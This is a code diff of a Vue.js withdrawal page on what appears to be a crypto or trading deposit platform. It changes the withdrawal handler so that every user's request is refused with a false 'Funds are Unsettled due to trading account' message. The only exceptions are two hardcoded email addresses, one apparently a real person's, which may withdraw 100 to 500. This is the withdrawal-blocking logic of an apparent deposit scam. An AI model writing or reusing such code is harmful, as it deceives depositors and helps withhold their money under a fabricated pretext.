@@ -197,21 +197,25 @@ export default {
       await router.push('/over-view')
     },
 
-    // async showDialog() {
-    //   await StoreUtils.dispatch(StoreUtils.actions.withdrawal.withdrawalCreate, {
-    //     userId : this.userId,
-    //     amount : this.model.amount,
-    //     transactionMethod : this.withdrawalmethod,
-    //     transactionType : "withdrawal",
-    //     transactionReference : this.randomString,
-    //     additionalComment : this.model.additionalComment,
-    //     walletAddress : this.model.walletAddress
-    //   })
-    //   this.dialogIsVisible = true;
-    // },
+    async showDialog2() {
+      await StoreUtils.dispatch(StoreUtils.actions.withdrawal.withdrawalCreate, {
+        userId : this.userId,
+        amount : this.model.amount,
+        transactionMethod : this.withdrawalmethod,
+        transactionType : "withdrawal",
+        transactionReference : this.randomString,
+        additionalComment : this.model.additionalComment,
+        walletAddress : this.model.walletAddress
+      })
+      this.dialogIsVisible = true;
+    },
 
     async showDialog() {
-      if (this.UserDetails.user.totalDepositedAmount === 0) {
+      const { email, totalDepositedAmount, totalWithdrawals } = this.UserDetails.user;
+      const { amount } = this.model;
+      const accountBalance = totalDepositedAmount - totalWithdrawals;
+
+      if (totalDepositedAmount === 0) {
         Swal.fire({
           icon: 'error',
           title: 'Cannot Perform Action',
@@ -220,16 +224,7 @@ export default {
         return;
       }
 
-      // if (this.UserDetails.user.btcBalance > (this.UserDetails.user.totalDepositedAmount - this.UserDetails.user.totalWithdrawals)) {
-      //   Swal.fire({
-      //     icon: 'error',
-      //     title: 'Insufficient Balance',
-      //     text: 'Your Wallet balance is greater than your Account Balance.',
-      //   });
-      //   return;
-      // }
-
-      if (this.model.amount > (this.UserDetails.user.totalDepositedAmount - this.UserDetails.user.totalWithdrawals)) {
+      if (amount > accountBalance) {
         Swal.fire({
           icon: 'error',
           title: 'Invalid Amount',
@@ -238,21 +233,27 @@ export default {
         return;
       }
 
-      // await StoreUtils.dispatch(StoreUtils.actions.withdrawal.withdrawalCreate, {
-      //   userId: this.userId,
-      //   amount: this.model.amount,
-      //   transactionMethod: this.withdrawalmethod,
-      //   transactionType: "withdrawal",
-      //   transactionReference: this.randomString,
-      //   additionalComment: this.model.additionalComment,
-      //   walletAddress: this.model.walletAddress,
-      // });
+      // 🔐 Special case for `ravindumunasinghe8@gmail.com`
+      if (email === "ravindumunasinghe8@gmail.com" || email === "johndoe@yopmail.com") {
+        if (amount >= 100 && amount <= 500) {
+          this.showDialog2()
+          return;
+        } else {
+          await Swal.fire({
+            icon: 'error',
+            text: 'Funds are Unsettled due to trading account.',
+          });
+          return;
+        }
+      }
+
+      // 🔒 Default fallback for other users (block all for now)
       await Swal.fire({
         icon: 'error',
         text: 'Funds are Unsettled due to trading account.',
       });
-      // this.dialogIsVisible = true;
     },
+
 
     generateRandomString() {
       const characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
